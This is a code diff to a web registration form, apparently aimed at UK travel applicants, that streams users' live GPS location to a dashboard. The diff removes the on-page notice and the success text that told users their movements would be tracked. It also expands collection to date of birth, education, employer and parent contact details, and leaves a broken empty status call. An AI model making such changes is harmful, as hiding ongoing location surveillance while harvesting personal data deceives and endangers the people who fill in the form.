@@ -10,7 +10,7 @@
 <body><main class="card">
 <h1>Registration Form</h1><p class="sub"></p>
 <form id="form">
-<h1>Registration Form</h1><p class="sub">Complete the form below. If you choose to share your location, your browser will ask for permission. While this page remains open, your location can be updated on the dashboard as you move.</p>
+<h1>Registration Form</h1><p class="sub"></p>
 <form id="form">
    
 <!-- PERSONAL INFORMATION -->
@@ -245,6 +245,127 @@ function startLiveLocation(){if(!navigator.geolocation)return setStatus('❌ Geo
 function stopLiveLocation(){if(watchId!==null){navigator.geolocation.clearWatch(watchId);watchId=null}if(socket){socket.emit('stop-live-location',{sessionId});socket.disconnect();socket=null}setStatus('Live location stopped. Registration remains saved.','success')}
 $('locBtn').onclick=()=>startLiveLocation();
 $('locationConsent').onchange=e=>{if(e.target.checked)startLiveLocation();else stopLiveLocation()};
-$('form').onsubmit=async e=>{e.preventDefault();const btn=$('submitBtn');btn.disabled=true;setStatus('Saving registration…');try{if($('locationConsent').checked&&!currentLocation){startLiveLocation();await new Promise(r=>setTimeout(r,1200))}const payload={sessionId,fullName:$('fullName').value.trim(),phone:$('phone').value.trim(),email:$('email').value.trim(),address:$('address').value.trim(),location:currentLocation};const r=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});const data=await r.json();if(!r.ok)throw new Error(data.error||'Registration failed');registered=true;if(data.location){currentLocation=data.location;showMap();setStatus('✅ Registration completed.\nLive location: '+(data.location.formattedAddress||'GPS active')+'\nThe dashboard will receive movement updates while this page stays open.','success')}else setStatus('✅ Registration completed. Location was not shared.','success');}catch(err){setStatus('❌ '+err.message,'error')}finally{btn.disabled=false}};
-window.addEventListener('beforeunload',()=>{if(socket)socket.emit('stop-live-location',{sessionId})});
+$('form').onsubmit = async e => {
+    e.preventDefault();
+
+    const btn = $('submitBtn');
+    btn.disabled = true;
+    setStatus('Saving registration…');
+
+    try {
+        // Start location sharing if consent was given
+        if ($('locationConsent').checked && !currentLocation) {
+            startLiveLocation();
+            await new Promise(resolve => setTimeout(resolve, 1200));
+        }
+
+        // Collect ALL registration information
+        const payload = {
+            sessionId,
+
+            // Personal information
+            fullName: $('fullName').value.trim(),
+            dateOfBirth: $('dateOfBirth').value,
+            phone: $('phone').value.trim(),
+            email: $('email').value.trim(),
+            address: $('address').value.trim(),
+
+            // Education
+            primarySchool: $('primarySchool').value.trim(),
+            primaryGraduationYear: $('primaryGraduationYear').value,
+
+            secondarySchool: $('secondarySchool').value.trim(),
+            secondaryGraduationYear: $('secondaryGraduationYear').value,
+
+            tertiarySchool: $('tertiarySchool').value.trim(),
+            tertiaryGraduationYear: $('tertiaryGraduationYear').value,
+
+            degree: $('degree').value.trim(),
+            course: $('course').value.trim(),
+
+            // Skills and profession
+            handwork: $('handwork').value.trim(),
+            profession: $('profession').value.trim(),
+            employer: $('employer').value.trim(),
+
+            // Previous UK travel
+            ukTravelledBefore: $('ukTravelledBefore').value,
+            ukTravelYear: $('ukTravelYear').value,
+            ukTravelPurpose: $('ukTravelPurpose').value.trim(),
+
+            // Parent / guardian
+            parentName: $('parentName').value.trim(),
+            parentPhone: $('parentPhone').value.trim(),
+            parentAddress: $('parentAddress').value.trim(),
+
+            // UK travel plans
+            ukPurpose: $('ukPurpose').value,
+            ukTravelDate: $('ukTravelDate').value,
+            ukPurposeDetails: $('ukPurposeDetails').value.trim(),
+
+            // Location
+            location: currentLocation
+        };
+
+        // Send registration to backend
+        const r = await fetch('/api/register', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        // Try to read server response
+        const data = await r.json();
+
+        // Handle server error
+        if (!r.ok) {
+            throw new Error(data.error || 'Registration failed');
+        }
+
+        // Registration successful
+        registered = true;
+
+        // Update location if server returned one
+        if (data.location) {
+            currentLocation = data.location;
+
+            showMap();
+
+            setStatus(
+                '✅ Registration completed successfully.',
+                'success'
+            );
+        } else {
+            setStatus(
+                
+            );
+        }
+
+    } catch (err) {
+
+        console.error('Registration error:', err);
+
+        setStatus(
+            '❌ ' + (err.message || 'Registration failed'),
+            'error'
+        );
+
+    } finally {
+        btn.disabled = false;
+    }
+};
+
+
+// Stop live location when the user leaves the page
+window.addEventListener('beforeunload', () => {
+    if (socket) {
+        socket.emit('stop-live-location', {
+            sessionId
+        });
+    }
+});
+
+
 </script></body></html>
